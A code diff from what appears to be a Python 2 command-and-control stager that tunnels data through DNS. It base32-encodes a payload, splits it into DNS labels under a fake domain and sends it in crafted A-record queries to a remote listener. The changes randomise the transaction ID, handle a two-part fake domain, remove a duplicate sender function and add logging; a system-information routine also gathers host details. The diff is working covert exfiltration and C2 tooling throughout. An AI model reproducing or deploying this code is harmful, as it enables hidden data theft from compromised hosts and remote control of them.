@@ -766,10 +766,19 @@ def pack_hostname_a(prefix, labels, fake_domain):
     bytes_prefix_host=prefix_len+(bytes(tmp))
 
     tmp = bytearray()
-    format_str='{}s'.format(len(fake_domain))
-    tmp=struct.pack(format_str,fake_domain)
-    fake_len=struct.pack('B',len(fake_domain))
-    bytes_fake_host=fake_len+(bytes(tmp))
+    domain_list = fake_domain.split('.')
+
+    format_str='{}s'.format(len(domain_list[0]))
+    tmp=struct.pack(format_str,domain_list[0])
+    fake_len=struct.pack('B',len(domain_list[0]))
+
+
+    format_str_suffix='{}s'.format(len(domain_list[1]))
+    tmp_suffix=struct.pack(format_str_suffix,domain_list[1])
+    fake_len_suffix=struct.pack('B',len(domain_list[1]))
+
+    
+    bytes_fake_host=fake_len+(bytes(tmp))+fake_len_suffix+(bytes(tmp_suffix))
     bytes_fake_host=bytes_fake_host+struct.pack('x')
     
     return bytes_prefix_host + labels + bytes_fake_host
@@ -873,15 +882,14 @@ def send_data_to_listener(prefix, sock, host, port, payload, fake_domain):
     m = hashlib.sha256(payload)
     print "SHA256 of data {}".format(m.hexdigest())
 
-    # TODO chose random txn ID
-    txn_id_bytes = bytearray(struct.pack('>H', int("e347",16)))
     full_b32_pkt = base64.b32encode(payload)
     print "About to send {}".format(full_b32_pkt)
     # max label length, 2 per lookup
     n = 63
     b32_pkt = bytearray()
     counter = 0
-    ip_recv = ""
+    ip_recv = ''
+    txn_id_bytes = ''
     b32_labels = [full_b32_pkt[i:i+n] for i in range(0, len(full_b32_pkt), n)]
     #print "b32_labels len {}".format(len(b32_labels))
     #print b32_labels
@@ -899,7 +907,9 @@ def send_data_to_listener(prefix, sock, host, port, payload, fake_domain):
         else:
             print "[STAGER] sending batch of two labels"
             counter = 0
+            txn_id_bytes = bytearray(struct.pack('>H', random.randint(0,65535)))
             a_record = bytearray(txn_id_bytes +struct.pack('BBBBBBBBBB',1,0,0,1,0,0,0,0,0,0))+pack_hostname_a(prefix, b32_pkt, fake_domain)+bytearray(struct.pack('BBBB',0,1,0,1))
+            print "[STAGER] sending pkt to host {} port {}".format(str(host), str(port))
             sock.sendto(a_record,(host,int(port)))
             reply,server_reply=sock.recvfrom(512)
             # TODO implement counter check based on server response
@@ -912,52 +922,6 @@ def send_data_to_listener(prefix, sock, host, port, payload, fake_domain):
     ip_recv=stop_data_to_listener_a(sock, host, int(port))
 
     return ip_recv
-
-def send_data_to_listener_a(prefix, sock, host, port, payload, fake_domain):
-    print "[STAGER] send_data_to_listener host {} port {} payload length {}".format(host, port, len(payload))
-    m = hashlib.sha256(payload)
-    print "SHA256 of data {}".format(m.hexdigest())
-
-    # TODO chose random txn ID
-    txn_id_bytes = bytearray(struct.pack('>H', int("e347",16)))
-    full_b32_pkt = base64.b32encode(payload)
-    print "About to send {}".format(full_b32_pkt)
-    # max label length, 2 per lookup
-    n = 63
-    b32_pkt = bytearray()
-    counter = 0
-    ip_recv = ""
-    b32_labels = [full_b32_pkt[i:i+n] for i in range(0, len(full_b32_pkt), n)]
-    #print "b32_labels len {}".format(len(b32_labels))
-    #print b32_labels
-
-    send_init_a_to_listener(sock, prefix, host, port, fake_domain)
-    
-    for i in range(0,len(b32_labels)+(len(b32_labels)/2)):
-        if counter <2:
-            print "[STAGER] processing label {} with i {} counter {}".format(b32_labels[0], i, counter)
-            label_len = bytearray(struct.pack('B', len(b32_labels[0])))
-            ba_b32=bytearray(label_len+bytes(b32_labels[0]))
-            b32_pkt.extend(ba_b32)
-            counter += 1
-            del b32_labels[0]
-        else:
-            print "[STAGER] sending batch of two labels"
-            counter = 0
-            a_record = bytearray(txn_id_bytes +struct.pack('BBBBBBBBBB',1,0,0,1,0,0,0,0,0,0))+pack_hostname_a(prefix, b32_pkt, fake_domain)+bytearray(struct.pack('BBBB',0,1,0,1))
-            sock.sendto(a_record,(host,int(port)))
-            reply,server_reply=sock.recvfrom(512)
-            # TODO implement counter check based on server response
-            b32_pkt = bytearray()
-    if b32_pkt:
-        a_record = bytearray(txn_id_bytes +struct.pack('BBBBBBBBBB',1,0,0,1,0,0,0,0,0,0))+pack_hostname_a(prefix, b32_pkt, fake_domain)+bytearray(struct.pack('BBBB',0,1,0,1))
-        print "[STAGER] sending agent pkt to {}".format(host)
-        sock.sendto(a_record,(host,int(port)))
-        reply,server_reply=sock.recvfrom(512)
-    ip_recv=stop_data_to_listener_a(sock, host, int(port))
-
-    return ip_recv
-
 
 def get_sysinfo(nonce='00000000'):
 
@@ -1002,7 +966,8 @@ def get_sysinfo(nonce='00000000'):
         pyVersion = "%s.%s" % (temp[0],temp[1])
     except Exception as e:
         pyVersion = __FAILED_FUNCTION
-
+        print 'Exception {}'.format(e)
+        
     language = 'python'
     cmd = 'ps %s' % (os.getpid())
     ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
